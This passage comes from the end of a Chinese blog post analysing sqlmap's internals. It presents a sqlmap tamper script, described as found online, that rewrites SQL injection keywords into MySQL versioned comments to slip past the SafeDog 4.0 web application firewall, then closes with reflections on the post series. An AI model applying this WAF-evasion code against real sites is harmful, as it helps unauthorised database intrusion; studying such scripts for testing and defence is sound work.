+<p><img src="../ksohtml20628/wps35.jpg" alt="img"></p>
+<p>在sqlmap的enums.py中我们可以看到引用的优先级的数值</p>
+<p><img src="../ksohtml20628/wps36.jpg" alt="img"></p>
+<p>还有数据库的类型参数</p>
+<p><img src="../ksohtml20628/wps37.jpg" alt="img"></p>
+<p>这边再丢上一个过4.0SafeDog的tamper脚本，，该脚本是在网上找的，具有较好的参考价值</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Copyright (c) 2006-2019 sqlmap developers ([url]http://sqlmap.org/[/url])
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">See the file &#39;LICENSE&#39; for copying permission
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Author:LUSHUN
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> lib.core.data <span style="color:#f92672">import</span> kb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> lib.core.enums <span style="color:#f92672">import</span> PRIORITY
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> lib.core.common <span style="color:#f92672">import</span> singleTimeWarnMessage
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> lib.core.enums <span style="color:#f92672">import</span> DBMS
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>__priority__ <span style="color:#f92672">=</span> PRIORITY<span style="color:#f92672">.</span>LOW
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dependencies</span>():
+</span></span><span style="display:flex;"><span>  singleTimeWarnMessage(<span style="color:#e6db74">&#34;Bypass safedog4.0&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39; only </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>basename(__file__)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)[<span style="color:#ae81ff">0</span>], DBMS<span style="color:#f92672">.</span>MYSQL))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tamper</span>(payload, <span style="color:#f92672">**</span>kwargs):
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>    payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;AND&#39;</span>,<span style="color:#e6db74">&#39;/*!11440AND*/&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>    payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;ORDER&#39;</span>,<span style="color:#e6db74">&#39;order/*!77777cz*/&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>    payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;SELECT&#34;</span>,<span style="color:#e6db74">&#34;/*!11440SELECT*/&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>    payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;SLEEP(&#34;</span>,<span style="color:#e6db74">&#34;sleep/*!77777cz*/(&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>    payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;UPDATEXML(&#34;</span>,<span style="color:#e6db74">&#34;UPDATEXML/*!77777cz*/(&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>    payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;SESSION_USER()&#34;</span>,<span style="color:#e6db74">&#34;/*!11440SESSION_USER()*/&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>    payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;USER())&#34;</span>,<span style="color:#e6db74">&#34;USER/*!77777cz*/())&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>    payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;DATABASE()&#34;</span>,<span style="color:#e6db74">&#34;DATABASE/*!77777cz*/()&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>    <span style="color:#66d9ef">return</span> payload
+</span></span></code></pre></div><h2 id="写在最后">写在最后</h2>
+<p>通过这两篇文章，即使是小白也一定对常见的SQL注入原理以及sqlmap运行的原理有了一定的理解和自己的看法。希望大家在使用工具的时候也了解一下漏洞原理和工具原理。在本次分析以前我也是没想到sqlmap的逻辑如此严密，各种检测手段和数学模型是我始料未及的，但是通过这次的深入分析也学到了不少东西，透过现象看本质才是最关键的。有了如此基础之后在魔改工具的过程中一定能够方便不少，同样地误报检测模型也进行了完善，如果有朝一日开发扫描器相信一定有不小的参考价值。</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
